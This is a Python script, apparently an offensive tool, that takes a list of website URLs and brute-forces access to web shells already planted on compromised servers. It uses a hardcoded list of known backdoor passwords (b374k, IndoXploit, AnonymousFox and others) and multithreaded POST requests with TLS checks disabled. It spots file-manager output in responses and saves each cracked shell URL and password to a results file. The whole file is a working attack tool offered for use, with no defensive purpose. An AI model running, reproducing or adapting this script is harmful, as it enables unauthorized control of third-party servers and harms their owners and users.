import os
import requests
import sys
import urllib3
from colorama import Fore, Style, init

# Initialize Colorama for colored terminal text
init(autoreset=True)

# Define color and style shortcuts
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

# Get the current directory and parent directory
current_directory = os.path.dirname(os.path.abspath(__file__))
parent_directory = os.path.dirname(current_directory)

# Function to create a directory if it doesn't exist
def create_folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

# Create a result directory
create_folder(os.path.join(parent_directory, 'result'))

# Disable urllib3 warnings
urllib3.disable_warnings()

# Initialize global variables
Good = 0
x = requests.session()

# Load target URLs from a file located one level above the script's directory
try:
    script_directory = os.path.dirname(os.path.abspath(__file__))
    parent_directory = os.path.dirname(script_directory)
    target_file = os.path.join(parent_directory, sys.argv[1])
    target = [i.strip() for i in open(target_file, mode='r').readlines()]
except IndexError:
    while True:
        input_file = input("LIST: ")
        target_file = os.path.join(parent_directory, input_file)
        if os.path.exists(target_file):
            break
        else:
            print("File tidak ditemukan. Silakan coba lagi.")
    target = [i.strip() for i in open(target_file, mode='r').readlines()]

# Function to check passwords on the given URL
def check_passwords(url):
    session = requests.session()
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    common_passwords = [
        'test', 'stusa', 'xleet', 'x505', 'damedesuyo8800', 'am*guAW8.ryDgz-TYF', 'Stusa', 'friv', 'fuck666', 'admin',
        '****', '*****', 'Haxor?1337', 'haxor', 'Haxor', 'imunify1337', 'Malyo1@8', '31337', '00w1wcRT', '022627raflixsec',
        '123', '123456', '12qwaszx', '1337', '133721', '1n73ction', '22XC', '404', '555', '731', 'a5e8z77', 'abcder',
        'achan', 'adminhoki', 'aerul', 'akudimana', 'alfa', 'anggie21', 'AnonGhost', 'AnonymousFox', 'asdsdggenu',
        'awokawok2', 'b374k', 'b3t4kun', 'BangPat?1337', 'banyumas', 'bheart2206', 'cantik', 'cmonqwe123#@!', 'con7extshell',
        'cyb3r', 'DapsquaD', 'DeadSec', 'default', 'elena', 'fff132f70f28194', 'G00DV1N', 'geronimo123', 'gfus', 'ghost287',
        'HACKED', 'hacker0882', 'hackmeDON', 'Hasilhoki', 'haurgeulis', 'haxor34', 'huypizdaprovoda', 'hxr1337', 'iamtheking',
        'IndexAttacker', 'IndoSec', 'IndoXploit', 'JH23FVDG32FD', 'jupiter2709', 'katib', 'kem', 'kontolcokasu', 'kontolgaceng',
        'kontoll471', 'kpxwbYBP4hQK', 'l o l', 'leksak98@', 'letmeinmobile', 'mad', 'memes', 'mini-shell', 'Mo2a0123', 'mravast',
        'myrepublic', 'oppaidragon', 'password', 'peler', 'peler666', 'Penolong40', 'phpshell', 'phpshells', 'pucek12345',
        'r00t', 'r00tsh3ll', 'rbbd95', 'RFkyy', 'root', 'root@kudajumping', 'Sandra@1199', 'sys123', 'T1KUS90T', 'tbl',
        'thopik123', 'tunafeesh', 'w0rms', 'xmina', 'zaza', 'zeeblaxx', '{ IndoSec }'
    ]

    shell_indicators = [
        "-rw-r--r--", ">File manager<", ">Upload file:", "drwxr-xr-x", "-rw-rw-rw-", "drwxrwxrwx", "Upload File :", "Writeable"
    ]

    for pw in common_passwords:
        try:
            response = session.post(url, headers=headers, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False)
            if any(indicator in response.text for indicator in shell_indicators):
                print(f"{fw}[{fg}chris{fw}] {fw}{url} {fw}<<{fg} Found Pass Shell with password '{pw}'")
                with open("../result/shellcracked.txt", "a") as file:
                    file.write(f"{url}#{pw}\n")
                break
        except requests.RequestException as e:
            print(f"Error checking password {pw} on {url}: {e}")

# Thread pool to handle multiple targets simultaneously
from multiprocessing.dummy import Pool
pool = Pool(10)
pool.map(check_passwords, target)
pool.close()
pool.join()
